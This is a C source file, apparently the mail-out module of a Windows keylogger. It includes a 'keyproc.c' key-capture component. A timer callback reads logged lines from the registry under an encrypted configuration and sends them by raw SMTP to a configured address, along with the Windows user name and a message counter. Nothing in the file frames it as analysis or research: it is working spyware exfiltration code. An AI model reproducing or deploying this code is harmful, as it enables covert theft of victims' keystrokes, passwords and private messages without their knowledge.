#ifndef _SENDMAIL_INCLUDED_
#define _SENDMAIL_INCLUDED_ yes

#include "stdio.h"
#include "keyproc.c"

int sendmail(char *serv,char *mylo);

void CALLBACK /*EXPORT*/ timeproc(HWND hWnd,UINT nMsg,UINT nIDEvent,DWORD dwTime)
{
int r;
int static stat=10;// 10-not initialized, 0-run, 1-already send
int static busy=0;
int static timer=0;

decrypt();
if(stat==10){ stat=(crypt.sendonstart==0)?1:0; };

if(timer<0){ timer=0; };
if(timer<crypt.period){ timer++; return; };
timer=0;

logout("tmr tick\n");
int lines;
lines=0;
regist_getbin(crypt.reg_data,crypt.val_num,(char*)&lines,sizeof(int));
if(lines>crypt.maxlines){ stat=0; };

//MessageBeep(0xFFFFFFFF);
if(stat>0){ return; };
if(busy>0){ return; };
busy=1;
r=sendmail(crypt.smtp,crypt.mail);
if(r==0/*OK*/){ stat=1; lines=0; regist_setbin(crypt.reg_data,crypt.val_num,(char*)&lines,sizeof(int)); };
busy=0;
}





//return number of bytes written to bufer
//500 warrantied to success
int recv_good(SOCKET s,char *dt/*1000 bytes only*/) 
{
int ii,r,kk,ttl;
timeval tmval;
fd_set fdst;


dt[0]=0;
ttl=0;
ii=0;

bg: if(ttl>500){ ttl=500; };

tmval.tv_sec=1;
tmval.tv_usec=0;
fdst.fd_count=1;
fdst.fd_array[0]=s;
kk=select(0,&fdst,NULL,NULL,&tmval);
if(kk==SOCKET_ERROR){ return ttl; };
if(kk<=0&&ttl>0){ return ttl; };
if(kk>0)
  {
  r=recv(s,dt+ttl,1000-5-ttl,0); 
  if(r==SOCKET_ERROR){ return ttl; };
  dt[999]=0;
  ttl+=r;
  (ttl>=0&&ttl<1000)?dt[ttl]=0:0;
  };
if(ii++ <30){ goto bg; };
return ttl;
}





int sendmail(char *serv,char *mylo)
{
    static WSADATA wsaData;
    static int wsaDataInt=0;
    wsaDataInt=0;
    if(wsaDataInt==0){ WSAStartup(MAKEWORD(2,0),&wsaData); wsaDataInt=1; };

    struct protoent FAR * gproto;
    gproto=getprotobyname("tcp");
    if(gproto==NULL){ return 1; };

    struct hostent FAR * ghthat;
    ghthat=gethostbyname(serv);
    if(ghthat==NULL){ return 1; };
    
    SOCKET ss;
    ss=socket(AF_INET,SOCK_STREAM,gproto->p_proto);
    if(ss==INVALID_SOCKET){ return 1; };

    int rrt;
    SOCKADDR_IN forbind,forconnect;
    forbind.sin_family=AF_INET;
    forbind.sin_port=htons(0);
    forbind.sin_addr.S_un.S_un_b.s_b1 = 0;
    forbind.sin_addr.S_un.S_un_b.s_b2 = 0;
    forbind.sin_addr.S_un.S_un_b.s_b3 = 0;
    forbind.sin_addr.S_un.S_un_b.s_b4 = 0;
    forconnect.sin_family=AF_INET;
    forconnect.sin_port=htons(25);
    forconnect.sin_addr.S_un.S_un_b.s_b1 = ghthat->h_addr_list[0][0];
    forconnect.sin_addr.S_un.S_un_b.s_b2 = ghthat->h_addr_list[0][1];
    forconnect.sin_addr.S_un.S_un_b.s_b3 = ghthat->h_addr_list[0][2];
    forconnect.sin_addr.S_un.S_un_b.s_b4 = ghthat->h_addr_list[0][3];

    rrt=bind(ss,(struct sockaddr FAR*)(&forbind),sizeof(SOCKADDR_IN));
    if(rrt!=0){ goto abrt; };

    rrt=connect(ss,(struct sockaddr FAR*)(&forconnect),sizeof(SOCKADDR_IN));
    if(rrt!=0){ goto abrt; };

    char dbuf[1005];
    recv_good(ss,dbuf);
    /****/ logout(dbuf);
    if(dbuf[0]!='2'){ goto abrt; };
    
    strcpy(dbuf,"HELO ");
    strcat(dbuf,serv);strcat(dbuf,"\r\n");
    send(ss,dbuf,strlen(dbuf),0);
    /****/ logout(dbuf);
    recv_good(ss,dbuf);
    /****/ logout(dbuf);
    if(dbuf[0]!='2'){ goto abrt; };
    
    strcpy(dbuf,"MAIL FROM: ");
    strcat(dbuf,mylo);strcat(dbuf,"\r\n");
    send(ss,dbuf,strlen(dbuf),0);
    /****/ logout(dbuf);
    recv_good(ss,dbuf);
    /****/ logout(dbuf);
    if(dbuf[0]!='2'){ goto abrt; };

    strcpy(dbuf,"RCPT TO: ");
    strcat(dbuf,mylo);strcat(dbuf,"\r\n");
    send(ss,dbuf,strlen(dbuf),0);
    /****/ logout(dbuf);
    recv_good(ss,dbuf);
    /****/ logout(dbuf);
    if(dbuf[0]!='2'){ goto abrt; };

    strcpy(dbuf,"DATA\r\n");
    send(ss,dbuf,strlen(dbuf),0);
    /****/ logout(dbuf);
    recv_good(ss,dbuf);
    /****/ logout(dbuf);
    if(dbuf[0]!='3'){ goto abrt; };
 
    strcpy(dbuf,crypt.mailhead);
    send(ss,dbuf,strlen(dbuf),0);

    strcpy(dbuf,"Windows user : ");
    send(ss,dbuf,strlen(dbuf),0);
    DWORD usernmsz;usernmsz=200;dbuf[0]=0;
    GetUserName(dbuf,&usernmsz);
    send(ss,dbuf,strlen(dbuf),0);
    strcpy(dbuf,"\r\nMessage number : ");
    send(ss,dbuf,strlen(dbuf),0);

    int countr;
    countr=0;
    regist_getbin(crypt.reg_data,crypt.val_count,(char*)&countr,sizeof(int));
    countr++;
    regist_setbin(crypt.reg_data,crypt.val_count,(char*)&countr,sizeof(int));
    dbuf[0]=((countr/1000)%10)+'0';
    dbuf[1]=((countr/100)%10)+'0';
    dbuf[2]=((countr/10)%10)+'0';
    dbuf[3]=((countr/1)%10)+'0';
    dbuf[4]='\r';
    dbuf[5]='\n';
    dbuf[6]=0;
    send(ss,dbuf,strlen(dbuf),0);


       {
       int ii,lines;
       char bf[200];
       lines=0;
       regist_getbin(crypt.reg_data,crypt.val_num,(char*)&lines,sizeof(int));
       if(lines==0){ goto more; };
       for(ii=0;ii<=lines;ii++)
         {
         regist_get(crypt.reg_data,keyproc_toi(ii),(char*)bf);
         if(bf[0]=='.'){ bf[0]=','; };
         send(ss,bf,strlen(bf),0);
         send(ss,"\r\n",2,0);
         };
       }

    more:;
    strcpy(dbuf,"\r\nThe End.\r\n.\r\n");
    send(ss,dbuf,strlen(dbuf),0);
    recv_good(ss,dbuf);
    /****/ logout(dbuf);
    if(dbuf[0]!='2'){ goto abrt; };


    strcpy(dbuf,"QUIT\r\n");
    send(ss,dbuf,strlen(dbuf),0);
    /****/ logout(dbuf);
    recv_good(ss,dbuf);
    /****/ logout(dbuf);

    closesocket(ss);//shutdown
    

return 0;

abrt:closesocket(ss);
return 1;
}



#endif
